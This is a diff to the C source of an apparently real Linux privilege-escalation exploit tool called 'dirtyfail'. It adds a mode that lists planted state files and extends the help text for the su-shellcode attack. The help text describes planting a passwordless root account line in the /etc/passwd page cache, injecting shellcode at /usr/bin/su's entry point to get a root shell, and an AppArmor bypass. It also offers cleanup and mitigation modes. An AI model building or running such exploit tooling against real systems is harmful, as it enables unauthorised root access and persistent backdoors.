@@ -71,14 +71,20 @@ static void usage(const char *prog)
 "  --exploit-backdoor     PERSISTENT: insert dirtyfail::0:0:..:/:/bin/bash\n"
 "                         into /etc/passwd page cache; survives shell exit\n"
 "                         until page eviction. Use --cleanup-backdoor to revert.\n"
-"  --exploit-su           V4bel-style: plant x86_64 shellcode at /usr/bin/su\n"
-"                         entry point in page cache; running su then yields\n"
-"                         a /bin/sh root shell. No PAM dependency. Saves\n"
-"                         original 48 bytes to /var/tmp/.dirtyfail-su.state\n"
-"                         for revert via --cleanup-su.\n"
+"  --exploit-su           V4bel-style: plant arch-specific shellcode at\n"
+"                         /usr/bin/su entry point in page cache; running\n"
+"                         su then yields a /bin/sh root shell. No PAM\n"
+"                         dependency. x86_64 tested; aarch64 ships but is\n"
+"                         hardware-untested (gated behind an env var).\n"
+"                         Saves original entry-point bytes to\n"
+"                         /var/tmp/.dirtyfail-su.state for revert via\n"
+"                         --cleanup-su.\n"
 "  --cleanup              evict /etc/passwd from page cache and drop_caches\n"
 "  --cleanup-backdoor     restore /etc/passwd line from /var/tmp/.dirtyfail.state\n"
 "  --cleanup-su           restore /usr/bin/su entry-point bytes from state file\n"
+"  --list-state           report what (if anything) is currently planted —\n"
+"                         reads /var/tmp/.dirtyfail*.state files and\n"
+"                         describes each. Side-effect free.\n"
 "  --mitigate             DEFENSIVE: blacklist algif_aead/esp4/esp6/rxrpc,\n"
 "                         set apparmor_restrict_unprivileged_userns=1.\n"
 "                         Requires root. Side-effect: breaks IPsec/AFS.\n"
@@ -134,6 +140,7 @@ enum mode {
     MODE_CLEANUP_SU,
     MODE_MITIGATE,
     MODE_CLEANUP_MITIGATE,
+    MODE_LIST_STATE,
     MODE_HELP,
     MODE_VERSION,
 };
@@ -217,6 +224,7 @@ int main(int argc, char **argv)
         {"cleanup-su",        no_argument, NULL, 19 },
         {"no-revert",         no_argument, NULL, 20 },
         {"json",              no_argument, NULL, 21 },
+        {"list-state",        no_argument, NULL, 22 },
         {"no-shell",         no_argument, NULL, 'n'},
         {"no-color",         no_argument, NULL, 'C'},
         {"aa-bypass",        no_argument, NULL,  8 },
@@ -253,6 +261,7 @@ int main(int argc, char **argv)
                        /* Propagate through fork+re-exec for AA bypass children */
                        setenv("DIRTYFAIL_JSON", "1", 1);
                        break;
+            case 22 :  m = MODE_LIST_STATE;       break;
             case 'n':  do_shell = false;          break;
             case 'C':  dirtyfail_use_color = false; break;
             case  8 :  aa_bypass = true;          break;
@@ -411,6 +420,23 @@ int main(int argc, char **argv)
     case MODE_CLEANUP_MITIGATE:
         r = mitigate_revert();
         break;
+
+    case MODE_LIST_STATE: {
+        log_step("--list-state: scanning /var/tmp for stashed dirtyfail state files");
+        bool any = false;
+        if (backdoor_list_state())    any = true;
+        if (exploit_su_list_state())  any = true;
+        if (!any) {
+            log_ok("no dirtyfail state files present — system is clean");
+        } else {
+            log_hint("(state files only describe what was planted — they do");
+            log_hint(" not by themselves prove the page cache is still poisoned;");
+            log_hint(" run `--cleanup` / `--cleanup-backdoor` / `--cleanup-su`");
+            log_hint(" to evict + restore.)");
+        }
+        r = DF_OK;
+        break;
+    }
 
     case MODE_CLEANUP:
         log_step("evicting /etc/passwd page cache");
